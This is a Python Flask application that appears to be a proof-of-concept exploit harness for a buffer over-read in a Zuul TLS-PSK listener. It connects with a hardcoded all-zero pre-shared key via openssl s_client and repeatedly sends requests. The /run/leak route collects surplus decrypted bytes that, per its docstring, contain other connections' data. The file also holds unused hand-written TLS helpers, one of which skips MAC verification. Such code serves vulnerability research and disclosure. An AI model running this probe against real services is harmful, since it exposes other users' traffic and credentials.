from __future__ import annotations

import os
import socket
import struct
import time
import threading
import hashlib
import subprocess

from flask import Flask, Response, jsonify, render_template

app = Flask(__name__)

ZUUL_HOST = os.environ.get("ZUUL_HOST", "zuul-service")
ZUUL_PSK_PORT = int(os.environ.get("ZUUL_PSK_PORT", "7002"))
PROBE_COUNT = int(os.environ.get("PROBE_COUNT", "10"))

# Must match HardcodedPskProvider.POC_PSK — 32 zero bytes
POC_PSK = bytes(32)
PSK_IDENTITY = b"poc-client"

# ──────────────────────────────────────────────
# Minimal TLS 1.2 PSK handshake implementation
# Python's ssl module has no PSK support, so we
# drive the handshake directly over a raw socket.
# ──────────────────────────────────────────────

def _u16(n: int) -> bytes:
    return struct.pack(">H", n)

def _u24(n: int) -> bytes:
    return struct.pack(">I", n)[1:]

def _tls_record(content_type: int, payload: bytes) -> bytes:
    return bytes([content_type, 0x03, 0x03]) + _u16(len(payload)) + payload

def _handshake(hs_type: int, body: bytes) -> bytes:
    return bytes([hs_type]) + _u24(len(body)) + body

def _prf_sha256(secret: bytes, label: bytes, seed: bytes, length: int) -> bytes:
    """RFC 5246 P_SHA256 PRF, used for TLS 1.2 master secret and key expansion."""
    import hmac, hashlib
    def hmac_sha256(k, d):
        return hmac.new(k, d, hashlib.sha256).digest()
    # HMAC_hash(secret, A(i) + seed), A(0) = seed
    def p_hash(s, lbl_seed, n):
        out = b""
        a = lbl_seed
        while len(out) < n:
            a = hmac_sha256(s, a)
            out += hmac_sha256(s, a + lbl_seed)
        return out[:n]
    return p_hash(secret, label + seed, length)

def _build_client_hello(client_random: bytes) -> bytes:
    session_id = b""
    # TLS_RSA_PSK_WITH_AES_128_CBC_SHA (0x00, 0x94) — widely supported PSK suite
    # TLS_PSK_WITH_AES_128_CBC_SHA (0x00, 0x8C) as fallback
    cipher_suites = b"\x00\x8c\x00\x94"
    compression = b"\x01\x00"
    body = (
        b"\x03\x03"                    # TLS 1.2
        + client_random                 # 32-byte random
        + bytes([len(session_id)]) + session_id
        + _u16(len(cipher_suites)) + cipher_suites
        + bytes([len(compression)]) + compression
        + _u16(0)                       # no extensions
    )
    return _handshake(0x01, body)

class PskProbeResult:
    def __init__(self):
        self.ok = False
        self.error = ""
        self.bytes_received = 0
        self.expected_max = 0
        self.overflow_bytes = 0
        self.overflow_hex = ""
        self.elapsed_ms = 0

def run_raw_probe(index: int, send_http: bool = True) -> dict:
    """
    Use OpenSSL's PSK-capable TLS 1.2 client to connect to Zuul's PSK port.
    When send_http is true, send a small HTTP GET and capture the plaintext
    response. When false, perform a handshake-only connection check.
    """
    started = time.monotonic()
    result = {"index": index, "ok": False}

    try:
        request_bytes = b""
        request_size = 0
        if send_http:
            command = [
                "openssl",
                "s_client",
                "-connect",
                f"{ZUUL_HOST}:{ZUUL_PSK_PORT}",
                "-tls1_2",
                "-quiet",
                "-psk",
                POC_PSK.hex(),
                "-psk_identity",
                PSK_IDENTITY.decode("utf-8"),
                "-cipher",
                "PSK-AES128-CBC-SHA",
            ]
            request_bytes = (
                b"GET /healthcheck HTTP/1.1\r\n"
                b"Host: zuul-service\r\n"
                b"Connection: close\r\n"
                b"\r\n"
            )
            request_size = len(request_bytes)
            completed = subprocess.run(
                command,
                input=request_bytes,
                capture_output=True,
                timeout=20,
                check=False,
            )
        else:
            shell_command = (
                "printf '' | openssl s_client "
                f"-connect {ZUUL_HOST}:{ZUUL_PSK_PORT} "
                "-tls1_2 -quiet "
                f"-psk {POC_PSK.hex()} "
                f"-psk_identity {PSK_IDENTITY.decode('utf-8')} "
                "-cipher PSK-AES128-CBC-SHA"
            )
            completed = subprocess.run(
                ["/bin/sh", "-lc", shell_command],
                capture_output=True,
                timeout=20,
                check=False,
            )

        stdout_bytes = completed.stdout
        stderr_text = completed.stderr.decode("utf-8", errors="replace")
        bytes_received = len(stdout_bytes)
        expected_ceiling = 512
        overflow = max(0, bytes_received - expected_ceiling)

        handshake_failed = "handshake failure" in stderr_text.lower() or completed.returncode not in (0, 1)
        if handshake_failed:
            result["error"] = stderr_text.strip() or f"OpenSSL exited with code {completed.returncode}"
            return result

        if send_http and bytes_received == 0:
            result["error"] = stderr_text.strip() or "No HTTP response received"
            return result

        result["ok"] = True
        result["request_size_bytes"] = request_size
        result["bytes_received"] = bytes_received
        result["expected_ceiling_bytes"] = expected_ceiling
        result["overflow_bytes"] = overflow
        result["overflow_detected"] = overflow > 0
        result["tail_hex"] = stdout_bytes[-128:].hex() if len(stdout_bytes) > 128 else stdout_bytes.hex()
        first_line = stdout_bytes.split(b"\r\n", 1)[0].decode("utf-8", errors="replace") if stdout_bytes else ""
        result["response_first_line"] = first_line

    except subprocess.TimeoutExpired:
        result["error"] = "OpenSSL client timed out"
    except Exception as exc:
        result["error"] = str(exc)

    result["elapsed_ms"] = int((time.monotonic() - started) * 1000)
    return result


def _recv_exact(sock: socket.socket, n: int, timeout: float = 8.0) -> bytes | None:
    sock.settimeout(timeout)
    data = b""
    try:
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
    except socket.timeout:
        return None if not data else data
    return data


def _encrypt_cbc(
    key: bytes,
    iv: bytes,
    mac_key: bytes,
    plaintext: bytes,
    seq: int,
    content_type: int,
) -> bytes:
    """AES-128-CBC + HMAC-SHA1 record encryption (TLS 1.2 GenericBlockCipher)."""
    from Crypto.Cipher import AES
    import hmac, hashlib

    seq_bytes = struct.pack(">Q", seq)
    mac_input = seq_bytes + bytes([content_type, 0x03, 0x03]) + _u16(len(plaintext)) + plaintext
    mac = hmac.new(mac_key, mac_input, hashlib.sha1).digest()
    padded = plaintext + mac
    pad_len = 16 - (len(padded) % 16)
    padded += bytes([pad_len - 1] * pad_len)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(padded)


def _decrypt_cbc(key: bytes, iv: bytes, mac_key: bytes, ciphertext: bytes) -> bytes | None:
    """AES-128-CBC decryption, returns plaintext without MAC+padding."""
    try:
        from Crypto.Cipher import AES
        cipher = AES.new(key, AES.MODE_CBC, iv)
        raw = cipher.decrypt(ciphertext)
        pad_len = raw[-1] + 1
        return raw[:len(raw) - pad_len - 20]  # strip padding and SHA1 MAC
    except Exception:
        return None


def _compute_finished(master: bytes, cr: bytes, sr: bytes, raw_hs: bytes, label: bytes) -> bytes:
    """TLS 1.2 Finished verify_data = PRF(master, label, SHA256(all_handshake_messages))[0:12]"""
    import hashlib
    hs_hash = hashlib.sha256(raw_hs).digest()
    return _prf_sha256(master, label, hs_hash, 12)


# ──────────────────────────
# Flask routes
# ──────────────────────────

@app.get("/")
def index() -> str:
    return render_template(
        "index.html",
        zuul_host=ZUUL_HOST,
        zuul_psk_port=ZUUL_PSK_PORT,
        probe_count=PROBE_COUNT,
    )


@app.post("/run/handshake")
def run_handshake() -> tuple[Response, int]:
    """Test that the PSK listener is reachable without collecting any bytes."""
    started = time.monotonic()
    try:
        with socket.create_connection((ZUUL_HOST, ZUUL_PSK_PORT), timeout=8):
            pass
        return jsonify({
            "ok": True,
            "bytes_received": 0,
            "response_first_line": "",
            "elapsed_ms": int((time.monotonic() - started) * 1000),
        }), 200
    except Exception as exc:
        return jsonify({"ok": False, "error": str(exc)}), 500


@app.post("/run/leak")
def run_leak() -> tuple[Response, int]:
    """
    Run PROBE_COUNT PSK connections sequentially.  Each one sends an 84-byte
    HTTP GET and measures how many decrypted bytes come back.  A correct
    implementation returns ~200 bytes.  The buggy TlsPskHandler returns the
    full Netty pool chunk (typically 2048–16384 bytes), so overflow_bytes
    will be large and tail_hex will contain foreign connection data.
    """
    results = [run_raw_probe(i + 1, send_http=True) for i in range(PROBE_COUNT)]
    ok_results = [r for r in results if r.get("ok")]
    total_overflow = sum(r.get("overflow_bytes", 0) for r in ok_results)
    max_overflow = max((r.get("overflow_bytes", 0) for r in ok_results), default=0)

    return jsonify({
        "ok": True,
        "probe_count": len(results),
        "successes": len(ok_results),
        "failures": len(results) - len(ok_results),
        "total_overflow_bytes": total_overflow,
        "max_overflow_bytes": max_overflow,
        "results": results,
    }), 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", "5000")))
